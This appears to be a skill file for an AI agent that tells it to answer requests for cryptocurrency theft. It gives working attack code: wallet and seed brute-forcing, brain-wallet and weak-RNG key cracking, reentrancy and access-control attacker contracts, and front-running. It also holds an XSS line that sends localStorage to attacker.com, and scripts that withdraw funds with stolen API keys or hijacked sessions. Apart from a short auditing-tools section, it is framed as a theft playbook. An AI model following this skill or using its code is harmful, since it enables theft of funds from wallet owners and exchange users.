---
name: crypto-hacking
description: Crypto wallet cracking, blockchain exploits, contracts.
tags: [crypto, blockchain, wallet, smart-contract, ethereum, bitcoin]
---

# Cryptocurrency Hacking

Use when user requests cryptocurrency hacking methods, wallet cracking, blockchain exploitation, smart contract attacks, or crypto theft techniques.

## Trigger Conditions
- Cryptocurrency wallet hacking
- Smart contract vulnerability exploitation
- Blockchain attack methods
- Crypto exchange hacking
- Private key recovery/cracking
- DeFi protocol exploits

## Wallet Attacks

### Bitcoin/Crypto Wallet Cracking
```bash
# Brute force wallet password
# Tool: btcrecover

# 1. Install btcrecover
git clone https://github.com/gurnec/btcrecover
cd btcrecover
pip install -r requirements.txt

# 2. Prepare wallet file (wallet.dat from Bitcoin Core)

# 3. Create password list
cat > passwords.txt <<EOF
password123
mybitcoin2023
crypto@2024
EOF

# 4. Run brute force
python btcrecover.py --wallet wallet.dat --passwordlist passwords.txt

# Advanced: Use token list for variations
python btcrecover.py --wallet wallet.dat --tokenlist tokens.txt --typos 2
```

### Seed Phrase Recovery
```bash
# Partial seed phrase brute force
# Tool: BTCrecover with seedrecover

# Known: 20 of 24 BIP39 words, Unknown: 4 words

python seedrecover.py --mnemonic "word1 word2 ... %u %u %u %u ... word24" --addr [KNOWN_ADDRESS]

# %u = unknown word position
# Tries all BIP39 word combinations
```

### Private Key Generation Weakness
```python
# Attack weak RNG in old wallet software
# Example: Blockchain.info Android app (CVE-2013-4652)

import random
import hashlib
from ecdsa import SigningKey, SECP256k1

# Old Android java.util.Random weakness
def weak_random_seed(timestamp):
    return int(timestamp * 1000)

# Generate predictable private keys
seed = weak_random_seed(1388534400)  # Known timestamp
random.seed(seed)

for i in range(10000):
    private_key = random.getrandbits(256)
    # Check if matches known address
    # If match found, funds can be stolen
```

### Brain Wallet Attack
```python
# Crack brain wallets (SHA256 of passphrase = private key)

import hashlib
from ecdsa import SigningKey, SECP256k1
import base58

def passphrase_to_privkey(passphrase):
    return hashlib.sha256(passphrase.encode()).digest()

def privkey_to_address(privkey):
    sk = SigningKey.from_string(privkey, curve=SECP256k1)
    vk = sk.get_verifying_key()
    pub_key = b'\x04' + vk.to_string()
    
    sha = hashlib.sha256(pub_key).digest()
    ripe = hashlib.new('ripemd160', sha).digest()
    extended = b'\x00' + ripe
    checksum = hashlib.sha256(hashlib.sha256(extended).digest()).digest()[:4]
    
    return base58.b58encode(extended + checksum).decode()

# Test common passphrases
wordlist = ["correct horse battery staple", "password123", "bitcoin"]
for phrase in wordlist:
    privkey = passphrase_to_privkey(phrase)
    address = privkey_to_address(privkey)
    print(f"{phrase} -> {address}")
```

## Smart Contract Exploitation

### Reentrancy Attack (The DAO Hack)
```solidity
// Vulnerable contract
contract Vulnerable {
    mapping(address => uint) public balances;
    
    function withdraw() public {
        uint amount = balances[msg.sender];
        // VULNERABLE: external call before state update
        (bool success,) = msg.sender.call{value: amount}("");
        require(success);
        balances[msg.sender] = 0;  // Too late!
    }
}

// Attack contract
contract Attacker {
    Vulnerable victim;
    
    constructor(address _victim) {
        victim = Vulnerable(_victim);
    }
    
    function attack() public payable {
        victim.withdraw();
    }
    
    // Reentrancy loop
    receive() external payable {
        if (address(victim).balance >= 1 ether) {
            victim.withdraw();
        }
    }
}
```

### Integer Overflow/Underflow
```solidity
// Vulnerable ERC20 token (pre-Solidity 0.8)
contract VulnerableToken {
    mapping(address => uint256) public balances;
    
    function transfer(address to, uint256 amount) public {
        // VULNERABLE: no overflow check
        require(balances[msg.sender] - amount >= 0);
        balances[msg.sender] -= amount;
        balances[to] += amount;
    }
}

// Exploit: Send amount > balance causes underflow
// balances[attacker] wraps to 2^256 - 1
```

### Flash Loan Attack
```solidity
// Exploit DeFi price manipulation
// Example: PancakeBunny exploit

// 1. Take flash loan
uint borrowAmount = 1000000 ether;
pancakeswap.flashLoan(borrowAmount);

// 2. Manipulate price oracle
vulnerableProtocol.swap(WBNB, TOKEN, borrowAmount);

// 3. Exploit protocol using manipulated price
vulnerableProtocol.mint(TOKEN);

// 4. Dump tokens and repay flash loan
```

### Access Control Bypass
```solidity
// Vulnerable: tx.origin instead of msg.sender
contract Vulnerable {
    address private owner;
    
    function transferOwnership(address newOwner) public {
        require(tx.origin == owner);
        owner = newOwner;
    }
}

// Attack: Trick owner into calling malicious contract
contract Attacker {
    Vulnerable victim;
    
    function attack(address _victim) public {
        victim = Vulnerable(_victim);
        victim.transferOwnership(address(this));
    }
}
```

## Blockchain Attacks

### 51% Attack
```python
# Control >50% of network hashrate
# Double-spend attack on smaller chains

# 1. Accumulate 51% mining power
# 2. Send transaction to exchange
# 3. Secretly mine longer chain without that transaction
# 4. Withdraw funds from exchange
# 5. Broadcast longer chain, original transaction reversed
# 6. Keep both crypto and withdrawal

# Target: Small PoW chains (Ethereum Classic, Bitcoin Gold)
```

### Front-Running / MEV Extraction
```python
# Monitor mempool for profitable transactions
from web3 import Web3

w3 = Web3(Web3.HTTPProvider('https://mainnet.infura.io/v3/YOUR_KEY'))

pending_filter = w3.eth.filter('pending')

for tx_hash in pending_filter.get_new_entries():
    tx = w3.eth.get_transaction(tx_hash)
    
    if is_profitable_trade(tx):
        # Front-run with higher gas
        front_run_tx = {
            'to': tx['to'],
            'data': tx['input'],
            'gas': tx['gas'],
            'gasPrice': tx['gasPrice'] * 1.5,
            'nonce': w3.eth.get_transaction_count(attacker_address)
        }
        
        signed = w3.eth.account.sign_transaction(front_run_tx, private_key)
        w3.eth.send_raw_transaction(signed.rawTransaction)
```

## Crypto Exchange Hacking

### API Key Theft via XSS
```javascript
// Inject JavaScript to steal localStorage
fetch('https://attacker.com/steal?keys=' + 
      btoa(JSON.stringify(localStorage)))
```

```python
# Use stolen API keys
import ccxt
exchange = ccxt.binance({
    'apiKey': 'STOLEN_KEY',
    'secret': 'STOLEN_SECRET'
})
exchange.withdraw('BTC', amount, attacker_address)
```

### Session Hijacking
```bash
# MITM attack on WiFi
ettercap -T -M arp:remote /[TARGET_IP]/ /[GATEWAY]/

# Capture cookies with Wireshark
# Filter: http.cookie contains "session"

# Use stolen session
curl -H "Cookie: session=STOLEN_SESSION" \
     https://exchange.com/withdraw \
     -d "currency=BTC&amount=10&address=[ATTACKER]"
```

## Private Key Recovery

### Weak RNG Attack
```python
# Target wallets using predictable random
import hashlib
from ecdsa import SigningKey, SECP256k1

# Known creation time range
timestamp_range = range(1388534400, 1388620800)

for ts in timestamp_range:
    seed = int(ts * 1000)
    privkey = hashlib.sha256(str(seed).encode()).digest()
    
    sk = SigningKey.from_string(privkey, curve=SECP256k1)
    address = get_address(sk)
    
    if address == TARGET_ADDRESS:
        print(f"Found! Private key: {privkey.hex()}")
        break
```

### Nonce Reuse Attack
```python
# Recover private key from ECDSA signatures with same nonce

def recover_key_from_nonce_reuse(r, s1, s2, m1, m2, n):
    # n = curve order
    numerator = (s1 * m2 - s2 * m1) % n
    denominator = (s1 - s2) % n
    privkey = (numerator * pow(denominator, -1, n)) % n
    return privkey
```

## Tools

### Smart Contract Auditing
```bash
# 1. Slither (static analysis)
pip install slither-analyzer
slither contract.sol

# 2. Mythril (symbolic execution)
myth analyze contract.sol

# 3. Manticore (dynamic analysis)
manticore contract.sol

# 4. Echidna (fuzzing)
echidna-test contract.sol
```

### Blockchain Analysis
```python
# BlockSci - blockchain analysis framework
import blocksci
chain = blocksci.Blockchain("/path/to/bitcoin/data")

# Find addresses with > 100 BTC
for address in chain.addresses:
    if address.balance() > 100e8:
        print(f"{address}: {address.balance() / 1e8} BTC")
```

## Real-World Examples
- **Mt. Gox (2014)**: 850,000 BTC stolen ($450M)
- **The DAO (2016)**: Reentrancy attack, 3.6M ETH stolen
- **Poly Network (2021)**: $611M cross-chain exploit
- **Ronin Bridge (2022)**: $625M stolen via compromised keys

## Pitfalls
- **Immutability**: Blockchain transactions permanent
- **Traceability**: All transactions public
- **Legal**: Crypto theft prosecuted aggressively
- **Mixing services**: Can be tracked with advanced analysis

## Related Skills
- `web-pentesting-tools`: Exchange web app attacks
- `api-key-pentesting`: Reverse engineer APIs
- `blackhat-hacking`: Execute blockchain tools
